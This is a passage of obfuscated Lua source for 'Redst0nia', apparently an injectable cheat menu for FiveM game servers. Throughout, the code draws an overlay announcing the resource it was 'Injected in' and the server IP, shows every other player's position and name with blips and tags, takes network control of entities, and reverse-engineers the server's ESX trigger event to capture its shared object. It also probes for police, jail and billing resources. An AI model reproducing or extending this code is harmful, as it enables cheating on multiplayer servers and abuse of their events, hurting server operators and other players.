    return UIMenuGridPanel.New(NF7L8VYrSw1y, Lg3jNc, b0bcfydYMLNahug9_, USraKtXXrbbI9zNr2cZ9z, lxJfY, A1lOj0JRs7ipU)
end
function NativeUI.CreateHorizontalGridPanel(S4WQoHDl9Uj, HPJXYRju, ec7aXcAw_DrU5)
    return UIMenuHorizontalOneLineGridPanel.New(S4WQoHDl9Uj, HPJXYRju, ec7aXcAw_DrU5)
end
function NativeUI.CreateVerticalGridPanel(yRPl0yhVPLukZAfKf94Z, uSvwMZp, XOYggJ0V)
    return UIMenuVerticalOneLineGridPanel.New(yRPl0yhVPLukZAfKf94Z, uSvwMZp, XOYggJ0V)
end
function NativeUI.CreateColourPanel(Ulk, Jdd)
    return UIMenuColourPanel.New(Ulk, Jdd)
end
function NativeUI.CreatePercentagePanel(Kc8R_ZYE, EYaMALeLrN77pit_)
    return UIMenuPercentagePanel.New(Kc8R_ZYE, EYaMALeLrN77pit_)
end
function NativeUI.CreateStatisticsPanel()
    return UIMenuStatisticsPanel.New()
end
function NativeUI.CreateSprite(
    ugpWR6X5P3N80GUHeimII,
    bwMr3l5h5NhqfChzqF9q,
    zugVh78paKbBZ,
    n0ewWGo9dptE6Bm,
    D1nVwlm804Ca,
    CRX4ympowCrBfe,
    rdp,
    hSF,
    kXN9,
    wh5kaC2N4,
    Cw8spVd)
    return Sprite.New(
        ugpWR6X5P3N80GUHeimII,
        bwMr3l5h5NhqfChzqF9q,
        zugVh78paKbBZ,
        n0ewWGo9dptE6Bm,
        D1nVwlm804Ca,
        CRX4ympowCrBfe,
        rdp,
        hSF,
        kXN9,
        wh5kaC2N4,
        Cw8spVd
    )
end
function NativeUI.CreateRectangle(
    BKp4VvWgB_4jeX1Z4iO,
    BZ9IPNRFxNlxVmY76PbU,
    uwM5AqLG_NZ6abEAt,
    koI,
    uxpTtNcAzJ_mC4hyj8,
    qpKpdB8FsXoIXBM,
    k8s,
    QnfP)
    return UIResRectangle.New(
        BKp4VvWgB_4jeX1Z4iO,
        BZ9IPNRFxNlxVmY76PbU,
        uwM5AqLG_NZ6abEAt,
        koI,
        uxpTtNcAzJ_mC4hyj8,
        qpKpdB8FsXoIXBM,
        k8s,
        QnfP
    )
end
function NativeUI.CreateText(
    h0Gcua9WrecJug,
    NVZ3iPG4hebJW,
    sCgAbwOXhRS65Rr,
    mixetbCUkOxzszLVmq,
    h6o4jN0siDP,
    NvOJrsUOXt,
    zPwomS5vIv,
    TpESq6u2gxmINY6fRp,
    T6q_Uba,
    DGy37M6wvB9,
    hEQEOn3QRzl,
    dpF,
    NBXjlWiZJVUnNLvnd)
    return UIResText.New(
        h0Gcua9WrecJug,
        NVZ3iPG4hebJW,
        sCgAbwOXhRS65Rr,
        mixetbCUkOxzszLVmq,
        h6o4jN0siDP,
        NvOJrsUOXt,
        zPwomS5vIv,
        TpESq6u2gxmINY6fRp,
        T6q_Uba,
        DGy37M6wvB9,
        hEQEOn3QRzl,
        dpF,
        NBXjlWiZJVUnNLvnd
    )
end
function NativeUI.CreateTimerBarProgress(
    jLkZPif,
    IRewUqlSV,
    qviGbhqZ1R91YEQ,
    xHU0HSlpCkAzs9cC4,
    qrXYoGt5RvNShK,
    ympja_FB,
    qTZwcf,
    s_ydiMRPoJTZKTO,
    LYQjMKRaEWnhI3Ap,
    IqzjFNHQh6oVyD80y)
    return UITimerBarProgressItem.New(
        jLkZPif,
        IRewUqlSV,
        qviGbhqZ1R91YEQ,
        xHU0HSlpCkAzs9cC4,
        qrXYoGt5RvNShK,
        ympja_FB,
        qTZwcf,
        s_ydiMRPoJTZKTO,
        LYQjMKRaEWnhI3Ap,
        IqzjFNHQh6oVyD80y
    )
end
function NativeUI.CreateTimerBar(
    d7J,
    Ft267i4z_I7TC6eQsb7A5,
    Zq2TeTW1,
    XNu0T,
    q,
    vbZg1e84,
    zvnHDAZ5QXYkJpkMgFBl,
    oKDSc43QOjQ8HlCGrM54i,
    ZmwYuQUbNaughH7p5,
    _5aL7wF276_o10sd)
    return UITimerBarItem.New(
        d7J,
        Ft267i4z_I7TC6eQsb7A5,
        Zq2TeTW1,
        XNu0T,
        q,
        vbZg1e84,
        zvnHDAZ5QXYkJpkMgFBl,
        oKDSc43QOjQ8HlCGrM54i,
        ZmwYuQUbNaughH7p5,
        _5aL7wF276_o10sd
    )
end
function NativeUI.CreateTimerBarProgressWithIcon(
    hVJRxOY,
    gInxGVq8wV96KCWSqHu,
    cU2hE4aNkUS,
    gZAeLK,
    JTikx1mjjz14jUqwAZZF,
    sFwqG0Ax6q,
    f06HKhqlh9oZw7fy,
    L1OtAYXppO,
    AIP4DdMk24o7ulC4,
    IpPWE8B4w7V6L_D4py,
    a_QnJ)
    return UITimerBarProgressWithIconItem.New(
        hVJRxOY,
        gInxGVq8wV96KCWSqHu,
        cU2hE4aNkUS,
        gZAeLK,
        JTikx1mjjz14jUqwAZZF,
        sFwqG0Ax6q,
        f06HKhqlh9oZw7fy,
        L1OtAYXppO,
        AIP4DdMk24o7ulC4,
        IpPWE8B4w7V6L_D4py,
        a_QnJ
    )
end
function NativeUI.TimerBarPool()
    return UITimerBarPool.New()
end
function NativeUI.ProgressBarPool()
    return UIProgressBarPool.New()
end
function NativeUI.CreateProgressBarItem(
    kzrFrC8,
    ClW9KN0ssTA,
    gkSnAxou5,
    r5N7o1G2tTw7W,
    CPUS5WnpSV3O,
    wmWeIVIFabxPDxWUr,
    udO04nmZkmQxhiKp6,
    UpxmIY)
    return UIProgressBarItem.New(
        kzrFrC8,
        ClW9KN0ssTA,
        gkSnAxou5,
        r5N7o1G2tTw7W,
        CPUS5WnpSV3O,
        wmWeIVIFabxPDxWUr,
        udO04nmZkmQxhiKp6,
        UpxmIY
    )
end
function RotationToDirection(CjOGmNX3xMbgGTWEEk1)
    local OqKUlGo75CHdG6owlQp = math.rad(CjOGmNX3xMbgGTWEEk1.z)
    local iyT9ctHCzfbB4uZag4Ts_ = math.rad(CjOGmNX3xMbgGTWEEk1.x)
    local ejDrADWhgBvinKiaIF5Cr = math.abs(math.cos(iyT9ctHCzfbB4uZag4Ts_))
    return vector3(
        -math.sin(OqKUlGo75CHdG6owlQp) * ejDrADWhgBvinKiaIF5Cr,
        math.cos(OqKUlGo75CHdG6owlQp) * ejDrADWhgBvinKiaIF5Cr,
        math.sin(iyT9ctHCzfbB4uZag4Ts_)
    )
end
function ScreenToWorld(l56PHhLcj68h)
    local xdn = GetGameplayCamRot(2)
    local NngfIVfqtxa1 = GetGameplayCamCoord()
    local DZe7XP = 0
    local wng5zfV = 0
    local rUB1FP = 0
    local HqyR5lT = 0
    local Yo2G5QksxCpfTGoxa1 = RotationToDirection(xdn)
    local vn0vtgIqAPcW8e7uF = vector3(xdn.x + 10, xdn.y + 0, xdn.z + 0)
    local zaTCs94Rz80 = vector3(xdn.x - 10, xdn.y + 0, xdn.z + 0)
    local x9fkLph = vector3(xdn.x, xdn.y + 0, xdn.z + -10)
    local iae91MACdx = RotationToDirection(vector3(xdn.x, xdn.y + 0, xdn.z + 10)) - RotationToDirection(x9fkLph)
    local d7lm52_GupPj2dotPhN = RotationToDirection(vn0vtgIqAPcW8e7uF) - RotationToDirection(zaTCs94Rz80)
    local XPVS_s3_X = -(math.rad(xdn.y))
    vect33 = (iae91MACdx * math.cos(XPVS_s3_X)) - (d7lm52_GupPj2dotPhN * math.sin(XPVS_s3_X))
    vect34 = (iae91MACdx * math.sin(XPVS_s3_X)) - (d7lm52_GupPj2dotPhN * math.cos(XPVS_s3_X))
    local MVLxQvD1XZx, TNowLr, EWcVybM1SY =
        WorldToScreenRel(((NngfIVfqtxa1 + (Yo2G5QksxCpfTGoxa1 * 10)) + vect33) + vect34)
    if not MVLxQvD1XZx then
        DZe7XP = TNowLr
        wng5zfV = EWcVybM1SY
        return NngfIVfqtxa1 + (Yo2G5QksxCpfTGoxa1 * 10)
    end
    local CfF88qaRU, Sp, pBB0dCjoXO06Xb6 = WorldToScreenRel(NngfIVfqtxa1 + (Yo2G5QksxCpfTGoxa1 * 10))
    if not CfF88qaRU then
        HqyR5lT = Sp
        rUB1FP = pBB0dCjoXO06Xb6
        return NngfIVfqtxa1 + (Yo2G5QksxCpfTGoxa1 * 10)
    end
    if math.abs(DZe7XP - HqyR5lT) < 0.001 or math.abs(wng5zfV - rUB1FP) < 0.001 then
        return NngfIVfqtxa1 + (Yo2G5QksxCpfTGoxa1 * 10)
    end
    local dilzE = (l56PHhLcj68h.x - HqyR5lT) / (DZe7XP - HqyR5lT)
    local iwpLTdWRF7_ = (l56PHhLcj68h.y - rUB1FP) / (wng5zfV - rUB1FP)
    return ((NngfIVfqtxa1 + (Yo2G5QksxCpfTGoxa1 * 10)) + (vect33 * dilzE)) + (vect34 * iwpLTdWRF7_)
end
function SubVectors(Nw8OsunJhx9pNOcgCl89, kaLtO5zJn7BhHqlKir5yj)
    return vector3(
        Nw8OsunJhx9pNOcgCl89.x - kaLtO5zJn7BhHqlKir5yj.x,
        Nw8OsunJhx9pNOcgCl89.y - kaLtO5zJn7BhHqlKir5yj.y,
        Nw8OsunJhx9pNOcgCl89.z - kaLtO5zJn7BhHqlKir5yj.z
    )
end
function GetCamDirFromScreenCenter()
    local JP6xc7qZn9rrIJ_04 = GetGameplayCamCoord()
    local Nu5w = ScreenToWorld(0, 0)
    local m0xn7edrxqB7FY7 = SubVectors(Nu5w, JP6xc7qZn9rrIJ_04)
    return m0xn7edrxqB7FY7
end
function WorldToScreenRel(zPpqyOgX7nN)
    local uc, w0TAS3, PwD6QpDvPdtqy = GetScreenCoordFromWorldCoord(zPpqyOgX7nN.x, zPpqyOgX7nN.y, zPpqyOgX7nN.z)
    if not uc then
        return false
    end
    screenCoordsx = (w0TAS3 - 0.5) * 2
    screenCoordsy = (PwD6QpDvPdtqy - 0.5) * 2
    return true, screenCoordsx, screenCoordsy
end
function DrawTxt(EpPK9YBBAy, L, _tD8L1vSAn3c3abcwpSE)
    SetTextFont(1)
    SetTextProportional(1)
    SetTextScale(0.0, 0.6)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(EpPK9YBBAy)
    DrawText(L, _tD8L1vSAn3c3abcwpSE)
end
function RequestModelSync(ru_viVNgfS7YN)
    local W3q2fVJk9B9JLMBC0SRR = GetHashKey(ru_viVNgfS7YN)
    RequestModel(W3q2fVJk9B9JLMBC0SRR)
    while not HasModelLoaded(W3q2fVJk9B9JLMBC0SRR) do
        RequestModel(W3q2fVJk9B9JLMBC0SRR)
        Citizen.Wait(0)
    end
end
function DrawText3D(gbYVjt8, iVyt8oXSPf, T, RCg8HsRN4Ellnv, lPfBNhIewz1mhYB, Qgw4OVEREbvjmEJYU, D9hGQjPzCPHMOAOF)
    SetDrawOrigin(gbYVjt8, iVyt8oXSPf, T, 0)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(0.0, 0.20)
    SetTextColour(lPfBNhIewz1mhYB, Qgw4OVEREbvjmEJYU, D9hGQjPzCPHMOAOF, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(RCg8HsRN4Ellnv)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end
local OvRzDp88nJQpyydFVL9D = false
Citizen.CreateThread(
    function()
        while menuEnabled do
            Wait(0)
            if radarStatus then
                DisplayRadar(true)
            end
            for id = 0, 255 do
                if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
                    ped = GetPlayerPed(id)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(id), false, false, "", false)
                    wantedLvl = GetPlayerWantedLevel(id)
                    if showsprite then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
                    end
                    if OvRzDp88nJQpyydFVL9D then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                            SetBlipNameToPlayerName(blip, id)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    SetBlipNameToPlayerName(blip, id)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, id)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or
                                            vehModel == GetHashKey("lazer")
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                            SetBlipNameToPlayerName(blip, id)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif
                                    vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or
                                        vehModel == GetHashKey("limo2")
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, id)
                                    end
                                elseif vehModel == GetHashKey("rhino") then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, id)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, id)
                                end
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, id)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(blip, id)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
                                distance =
                                    (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)
local ELrvdTCV1M = {__gc = function(TNj3b6hzaavYJ0)
        if TNj3b6hzaavYJ0.destructor and TNj3b6hzaavYJ0.handle then
            TNj3b6hzaavYJ0.destructor(TNj3b6hzaavYJ0.handle)
        end
        TNj3b6hzaavYJ0.destructor = nil
        TNj3b6hzaavYJ0.handle = nil
    end}
function EnumerateEntities(u_LQ0mnh_Z2Gxzx30, QxXIahyKZ0M6, Xd_7ii6Rni)
    return coroutine.wrap(
        function()
            local n0A4TeQd3DA69L4GI, w = u_LQ0mnh_Z2Gxzx30()
            if not w or w == 0 then
                Xd_7ii6Rni(n0A4TeQd3DA69L4GI)
                return
            end
            local xDLMp = {handle = n0A4TeQd3DA69L4GI, destructor = Xd_7ii6Rni}
            setmetatable(xDLMp, ELrvdTCV1M)
            local A2q2bJg3TQi9A_EL = true
            repeat
                coroutine.yield(w)
                A2q2bJg3TQi9A_EL, w = QxXIahyKZ0M6(n0A4TeQd3DA69L4GI)
            until not A2q2bJg3TQi9A_EL
            xDLMp.destructor, xDLMp.handle = nil, nil
            Xd_7ii6Rni(n0A4TeQd3DA69L4GI)
        end
    )
end
function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end
function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end
function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end
function RequestControlOnce(aGMm)
    if not NetworkIsInSession() or NetworkHasControlOfEntity(aGMm) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(aGMm), true)
    return NetworkRequestControlOfEntity(aGMm)
end
local function S2J(Q)
    if streamerModeStatus then
        if excludeSelfStreamStat then
            if Q == PlayerId() then
                return GetPlayerName(Q)
            else
                return "StreamerMode"
            end
        else
            return "StreamerMode"
        end
    else
        return GetPlayerName(Q)
    end
end
local function CahvwB3vGb(n5LozurPVpV)
    SetNotificationTextEntry("STRING")
    AddTextComponentString("~r~Redst0nia:~s~ " .. n5LozurPVpV)
    DrawNotification(false, false)
end
local xI2CkjpiOK8EMDx1SCtD = LoadResourceFile("es_extended", "client/common.lua")
if xI2CkjpiOK8EMDx1SCtD then
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("AddEventHandler", "")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("cb", "")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("function ", "")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("return ESX", "")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("(ESX)", "")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("function", " ")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("getSharedObject%(%)", "")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("end", "")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("%(", "")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("%)", "")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub(",", "")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("", "")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("'", "")
    xI2CkjpiOK8EMDx1SCtD = xI2CkjpiOK8EMDx1SCtD:gsub("%s+", "")
    if tostring(xI2CkjpiOK8EMDx1SCtD) ~= "esx:getSharedObject" then
        CahvwB3vGb("This server is using trigger replacement! Be aware")
    end
end
ESX = nil
Citizen.CreateThread(
    function()
        while ESX == nil do
            TriggerCustomEvent(
                false,
                tostring(xI2CkjpiOK8EMDx1SCtD),
                function(k8l)
                    ESX = k8l
                end
            )
            CahvwB3vGb("ESX was set to : " .. tostring(xI2CkjpiOK8EMDx1SCtD))
            Citizen.Wait(30000)
        end
    end
)
local Pru_stEONRLbt_0EeMx = 1800
local Zq6LoYA2iTci = 500
Pru_stEONRLbt_0EeMx = Pru_stEONRLbt_0EeMx + 0.0
Zq6LoYA2iTci = Zq6LoYA2iTci + 0.0
local Ylr442mzV7_qo7glKLZr = Pru_stEONRLbt_0EeMx / 1.4
local dL3gLfg8OIwljjM_9 = 245.0
local OAf14Vphu3V = 29 -- B
local hcmnFj7ddqmbgXI5lN = {165, 0, 0}
local HrVTH5ewMKL1Pj = "v2.4"
local aBUogggjoyRteh = "~b~Developer: csharp#4925 discord.gg/x8ySQcp"
local aW60GlTo7turR =
    NativeUI.CreateRectangle(
    nil,
    nil,
    nil,
    nil,
    hcmnFj7ddqmbgXI5lN[1],
    hcmnFj7ddqmbgXI5lN[2],
    hcmnFj7ddqmbgXI5lN[3],
    255
)
local MfoUxfed8hjNNy = true
waterStatus = true
moreinfoStatus = true
textscreen = "Redst0nia " .. HrVTH5ewMKL1Pj
offset = {x = 0.905, y = 0.001}
alpha = 255
scale = 0.4
font = 8
Citizen.CreateThread(
    function()
        while true do
            Wait(1)
            if waterStatus then
                rgb = Wf(1)
                SetTextColour(rgb.r, rgb.g, rgb.b, alpha)
                SetTextFont(font)
                SetTextScale(scale, scale)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString(textscreen)
                DrawText(offset.x, offset.y)
            end
        end
    end
)
Citizen.CreateThread(
    function()
        while true do
            Wait(1)
            if moreinfoStatus then
                rgb = {r = 225, g = 0, b = 0}
                SetTextColour(rgb.r, rgb.g, rgb.b, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString("Injected in :")
                DrawText(0.17, 0.8)
                SetTextColour(255, 255, 255, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString(GetCurrentResourceName())
                DrawText(0.23, 0.8)
                SetTextColour(rgb.r, rgb.g, rgb.b, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString("IP : ")
                DrawText(0.17, 0.825)
                SetTextColour(255, 255, 255, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString(GetCurrentServerEndpoint())
                DrawText(0.19, 0.825)
                SetTextColour(rgb.r, rgb.g, rgb.b, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString("Player Name : ")
                DrawText(0.17, 0.85)
                SetTextColour(255, 255, 255, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString(S2J(PlayerId()))
                DrawText(0.24, 0.85)
                SetTextColour(rgb.r, rgb.g, rgb.b, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString("Player Server ID : ")
                DrawText(0.17, 0.875)
                SetTextColour(255, 255, 255, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString(GetPlayerServerId(PlayerId()))
                DrawText(0.257, 0.875)
                SetTextColour(rgb.r, rgb.g, rgb.b, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString("Player Coords : ")
                DrawText(0.17, 0.9)
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                roundx = tonumber(string.format("%.2f", x))
                roundy = tonumber(string.format("%.2f", y))
                roundz = tonumber(string.format("%.2f", z))
                SetTextColour(255, 255, 255, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString("X : " .. roundx .. " Y : " .. roundy .. " Z : " .. roundz)
                DrawText(0.25, 0.9)
                SetTextColour(rgb.r, rgb.g, rgb.b, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString("Resources number : ")
                DrawText(0.17, 0.925)
                SetTextColour(255, 255, 255, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString(GetNumResources())
                DrawText(0.27, 0.925)
                SetTextColour(rgb.r, rgb.g, rgb.b, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString("ESX is set to : ")
                DrawText(0.17, 0.95)
                SetTextColour(255, 255, 255, alpha)
                SetTextFont(font)
                SetTextScale(0.35, 0.35)
                SetTextWrap(0.0, 1.0)
                SetTextCentre(false)
                SetTextDropshadow(2, 2, 0, 0, 0)
                SetTextEdge(1, 0, 0, 0, 205)
                SetTextEntry("STRING")
                AddTextComponentString(tostring(xI2CkjpiOK8EMDx1SCtD))
                DrawText(0.24, 0.95)
            end
        end
    end
)
local gzhXdn5rXT132aD = {}
if GetResourceState("es_extended") ~= "missing" and GetResourceState("es_extended") == "started" then
    gzhXdn5rXT132aD["es_extended"] = true
else
    gzhXdn5rXT132aD["es_extended"] = false
end
if GetResourceState("vrp") ~= "missing" and GetResourceState("vrp") == "started" then
    gzhXdn5rXT132aD["vrp"] = true
else
    gzhXdn5rXT132aD["vrp"] = false
end
if GetResourceState("esx_policejob") ~= "missing" and GetResourceState("esx_policejob") == "started" then
    gzhXdn5rXT132aD["esx_policejob"] = true
else
    gzhXdn5rXT132aD["esx_policejob"] = false
end
if GetResourceState("esx_ambulancejob") ~= "missing" and GetResourceState("esx_ambulancejob") == "started" then
    gzhXdn5rXT132aD["esx_ambulancejob"] = true
else
    gzhXdn5rXT132aD["esx_ambulancejob"] = false
end
if GetResourceState("esx_jail") ~= "missing" and GetResourceState("esx_jail") == "started" then
    gzhXdn5rXT132aD["esx_jail"] = true
else
    gzhXdn5rXT132aD["esx_jail"] = false
end
if GetResourceState("esx-qalle-jail") ~= "missing" and GetResourceState("esx-qalle-jail") == "started" then
    gzhXdn5rXT132aD["esx-qalle-jail"] = true
elseif GetResourceState("esx_qalle_jail") ~= "missing" and GetResourceState("esx_qalle_jail") == "started" then
    gzhXdn5rXT132aD["esx-qalle-jail"] = true
else
    gzhXdn5rXT132aD["esx-qalle-jail"] = false
end
if GetResourceState("esx_spectate") ~= "missing" and GetResourceState("esx_spectate") == "started" then
    gzhXdn5rXT132aD["esx_spectate"] = true
else
    gzhXdn5rXT132aD["esx_spectate"] = false
end
if GetResourceState("esx_billing") ~= "missing" and GetResourceState("esx_billing") == "started" then
    gzhXdn5rXT132aD["esx_billing"] = true
else
    gzhXdn5rXT132aD["esx_billing"] = false
end
if GetResourceState("jsfour-blindfold") ~= "missing" and GetResourceState("jsfour-blindfold") == "started" then
    gzhXdn5rXT132aD["jsfour-blindfold"] = true
else
